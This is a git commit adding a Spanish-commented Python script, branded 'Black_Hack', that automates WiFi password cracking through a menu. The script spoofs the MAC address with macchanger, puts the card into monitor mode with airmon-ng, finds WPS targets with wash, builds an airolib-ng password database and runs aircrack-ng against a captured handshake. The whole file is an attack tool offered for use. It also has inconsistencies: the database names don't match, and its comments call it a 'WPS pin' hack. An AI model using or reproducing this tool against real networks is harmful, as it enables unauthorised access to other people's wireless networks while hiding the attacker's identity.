981cb2b9721baee228676b1103e99836f86f12da
David <sotodelanoche@gmail.com>
2020-07-25 22:18:20 +0000

    Add files via upload

---
+++ raimbow.py
@@ -0,0 +1,96 @@
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+import os, time, threading, io
+
+## Crador Smp_A
+# Fecha 25.7.2020
+# Licencia Open soft GNU
+# Nombre programa Rambo WiFi telefono
+# Tipo Script shell
+# Hack pin wps Wifi basado en craking rainbow
+# lenguaje Python3 
+#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+os.system('clear')
+print("\033[1;31;1m ")
+os.system('figlet        Smp_A')
+print("			  	   Black_Hack")                 	
+print("\033[1;37;1m ")
+#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+listamenu=["opciones:","1) selec Wlan & changer Mac" ,"2) Scaner red ", "3) Crack rainbow","4) Exit"]#Menu Princcipal
+key=0
+exit=False
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+def menu():
+	print("     "+listamenu[0])
+	print(listamenu[1])
+	print(listamenu[2])
+	print(listamenu[3])
+	print(listamenu[4])
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+def config():
+	global wlan
+	while True:
+		try:
+			os.system("ifconfig")
+			wlan=input("Introduzca Wlan: ")
+			print("Procesando")
+			os.system('ip link set '+wlan+' up')
+			os.system('airmon-ng check kill')
+			os.system('macchanger -A '+wlan) 
+			os.system('airmon-ng start '+wlan)
+			return wlan
+			break
+		except TypeError:
+			print("Wlan no permitida")
+
+def scan(wlan):
+		while True:
+			try:
+				dic=input("Quiere procesar diccionario personal: ")
+				if(dic=='y'):
+					wordlist=input("Introduzca ruta y nombre: ")
+					os.system('airolib-ng raibonw-db --import passwd '+wordlist)
+				else:
+					os.system('airolib-ng raibonw-db --import passwd wordlist')			
+				os.system('wash -i '+wlan)
+				ESSID=input("seleccione ESSID : ")
+				file = open("/root/Especial_termux_kali/essidfile.txt","w")
+				file.write(ESSID)
+				file.close()
+				os.system('airolib-ng rainbow-db --import essid essidfile')
+				break
+			except TypeError:
+				print("Failed")
+def attack():
+	os.system('airolib-ng rainbow-db --batch')
+	cap=input("Introduzca file.cap: ")
+	os.system('aircrack-ng -r rainbow-db '+cap)
+
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+while exit==False:
+	menu()
+	key=(int(input()))
+	if (key==1):
+		config()
+		print(wlan)
+	elif (key==2):
+		scan(wlan)
+	elif (key==3):
+		attack()
+	elif (key==4):
+		#os.syste('airmon-ng stop wlan0mon')
+		#os.syste('ifconfig wlan0 down')
+		#os.syste('iwconfig wlan0 mode managed')
+		#os.syste('ifconfig wlan0 up')
+		#os.system('service network-manager start')
+		exit=True
+#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
